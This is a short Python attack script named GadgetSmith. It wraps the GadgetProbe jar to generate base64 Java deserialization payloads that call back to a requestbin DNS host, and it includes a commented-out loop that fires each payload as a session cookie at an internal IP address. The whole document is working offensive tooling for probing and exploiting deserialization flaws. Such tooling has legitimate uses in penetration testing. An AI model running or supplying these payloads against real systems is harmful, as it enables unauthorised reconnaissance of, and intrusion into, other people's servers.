import subprocess, sys, requests

banner = """

[+] GadgetSmith 0x01 
Generate GadgetProbe payloads in base64 with free dnsbin (https://requestbin.net/dns)
Usage: python3 GadgetSmith.py wordlist.txt XXXXX.d.requestbin.net
"""

if len(sys.argv) < 2:
	print(banner)
	sys.exit

wordlist = sys.argv[1]

dnsbin = sys.argv[2]

get_payloads = subprocess.getoutput("java -cp '.:GadgetProbe-1.0-SNAPSHOT-all.jar' gen_payloads.java %s %s" % (wordlist,dnsbin))

# payloads list in base64 format
payloads = [ x for x in get_payloads.split('\n') if x.startswith('rO0') ]


if not payloads:
	print("[!] Something went wrong while generating payloads!")
	sys.exit()

""" 
# Your code to fuzz anything goes here

for payload in payloads:
	resp = requests.get("http://172.16.95.1:8000",timeout=30,headers={"Cookie": "JSESSID=%s" % payload})
	print(resp.status_code)
"""
